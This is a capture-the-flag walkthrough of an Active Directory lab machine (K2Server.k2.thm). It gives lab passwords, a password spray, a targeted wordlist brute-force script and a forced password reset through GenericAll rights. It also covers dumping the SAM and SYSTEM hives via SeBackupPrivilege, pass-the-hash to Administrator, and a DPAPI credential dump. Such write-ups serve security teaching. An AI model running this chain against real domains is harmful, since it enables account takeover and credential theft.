# Middle Camp

## Machine Info

FQDN: K2Server.k2.thm

Domain: k2.thm

Domain SID: S-1-5-21-1966530601-3185510712-10604624



Data from Base Camp phase

```
james:Pwd@9tLNrC3!       James Bold 
root:RdzQ7MSKt)fNaz3!
rose:VrMAogdfxW!9        Rose Bud

bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
```



## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.145.48 -oN port_scan.txt

Nmap scan report for 10.10.145.48
Host is up (0.038s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-30 13:55:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-07-30T13:57:24+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=K2Server.k2.thm
| Not valid before: 2025-07-29T13:51:27
|_Not valid after:  2026-01-28T13:51:27
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2SERVER
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2Server.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-30T13:56:44+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

```



## AD user enum

All services has the anonymous/guest logon enable. We can think to use the data found in the previous challenge.

In AD env often the username of the account is the first letter of name, dot, complete surname. Try to do this with 2 user found in the Linux Server.&#x20;

```
j.bold
r.bud
```

### AD user verify

To verify if the users exist in the domain we can use this command with Kerbrute tool:

```bash
./kerbrute_linux_amd64 userenum userlist.txt  --domain k2.thm --dc 10.10.145.48
```

<figure><img src="../../../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

Both users are valid.

Now we can try to do a Password Spray attack with credentials found in the previous challenge.

{% code title="passwd.list" %}
```
Pwd@9tLNrC3!
VrMAogdfxW!9
RdzQ7MSKt)fNaz3!
PasSW0Rd321
St3veRoxx32
PartyAlLDaY!32
L0v3MyDog!3!
PikAchu!IshoesU!
vRMkaVgdfxhW!8
```
{% endcode %}

```bash
crackmapexec smb 10.10.145.48 -u userlist.txt -p passwd.list

SMB         10.10.145.48    445    K2SERVER         [+] k2.thm\r.bud:vRMkaVgdfxhW!8 
```

We found a valid credentials. With this creds we can run enum4linux with them and find all users.

```
'1113':
  username: r.bud
'1114':
  username: j.bold
'1115':
  username: j.smith
  name: (null)
'500':                                                                                                                                                                                                                                      
  username: Administrator
  name: (null)                                                                                                                                                                      
'501':
  username: Guest                                                                                                                                                                
'502':                                                                                                                                                                                                                                      
  username: krbtgt
```

### Access to the server as Domain user

```bash
evil-winrm -i 10.10.82.211 -u 'r.bud' -p 'vRMkaVgdfxhW!8'
```

In the Documents directory of the user we found this 2 txt files.

{% code overflow="wrap" %}
```
> more note_to_james.txt

Hello James:

Your password "rockyou" was found to only contain alphabetical characters. I have removed your Remote Access for now.

At the very least adhere to the new password policy:
1. Length of password must be in between 6-12 characters
2. Must include at least 1 special character
3. Must include at least 1 number between the range of 0-999
```
{% endcode %}

{% code overflow="wrap" %}
```
> more notes.txt

Done:
1. Note was sent and James has already performed the required action. They have informed me that they kept the base password the same, they just added two more characters to meet the criteria. It is easier for James to remember it that way.

2. James's password meets the criteria.

Pending:
1. Give James Remote Access.

```
{% endcode %}

In this notes we understand that the current password for James is "rockyou" with more 2 chars to adempt the criteria.

Password info

* "rockyou": base password
* 1 special char more
* 1 number between 0-999 more

With this information we can create a simple script for generate a dedicated wordlist to guess the password. (I use only 9 numbers becaouse in the note, it's written that james has add only 2 char)

```python
import string

base_word = "rockyou"
max_number = 9
special_chars = "!@#$%^&*()-_=+}|{;:?><"

output_file = "new_wordlist.txt"

with open(output_file, "w") as fipo:
    for num in range(max_number + 1):
        for char in special_chars:
            word = f"{base_word}{char}{num}"
            fipo.write(word + "\n")
            word = f"{base_word}{num}{char}"
            fipo.write(word + "\n")
            word = f"{num}{char}{base_word}"
            fipo.write(word + "\n")
            word = f"{char}{num}{base_word}"
            fipo.write(word + "\n")

print("[+] Wordlist generated!")
```

Using the bruteforcing function of kerbrute try to guessing James's password.

{% code overflow="wrap" %}
```bash
./kerbrute_linux_amd64 bruteuser new_wordlist.txt j.bold --domain k2.thm --dc 10.10.82.211
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
[+] VALID LOGIN:  j.bold@k2.thm:#8rockyou
```

We found valid credentials for James user.&#x20;

## Bloodhound enumeration

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.82.211 -dc K2Server.k2.thm -d k2.thm --zip -u 'j.bold' -p '#8rockyou'
```
{% endcode %}

We can see that the `IT STAFF 1` group has the `GenericAll` privs to `j.smith` account. It means that we can change the j.smith's password.

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
rpcclient -U K2.thm/j.bold K2Server.k2.thm
> #8rockyou

setuserinfo2 j.smith 23 'Password123!'
```

Now access with this new credentials to Domain Controller using WinRM.

```bash
evil-winrm -i 10.10.82.211 -u 'j.smith' -p 'Password123!'
```

Print the user flag

```
more C:\Users\j.smith\Desktop\user.txt
```



## Privilege Escalation



Look up the j.smith's privileges we can see this:

```powershell
whoami /all
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### SeBackupPrivilege PrivEsc

With these 2 privileges we can request the SAM and SYSTEM file which contents the local passwords of the machine.

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

Now download them to our local machine using `download` function of evil-winrm.

```
> download sam
> download system
```

Now using impacket-secretsdump extracts the hash

```
impacket-secretsdump -sam sam -system system LOCAL

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b5....ae86c37b32f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

With the Administrator's NTLM we can try to connect through winRM using evil-winrm and pass-the-hash technique.

```
evil-winrm -i 10.10.82.211 -u 'Administrator' -H '9545b6...0ae86c37b32f'
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Print the root flag

```powershell
more C:\Users\Administrator\Desktop\root.txt
```

View all user that can access to the server:

```powershell
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/29/2024   6:51 PM                Administrator
d-----        5/29/2023  10:23 PM                j.bold
d-----        5/29/2023  10:23 PM                j.smith
d-r---       12/12/2018   7:45 AM                Public
d-----        5/29/2023   9:47 PM                r.bud
```



## Post-Compromise

### DPAPI

Try to dump other credentials through DPAPI

<pre class="language-bash"><code class="lang-bash">nxc smb 10.10.250.241 -u 'administrator' -H '9545b61858c043477c350ae86c37b32f' --dpapi

<strong>K2\Administrator:vz0q$i8b4c
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

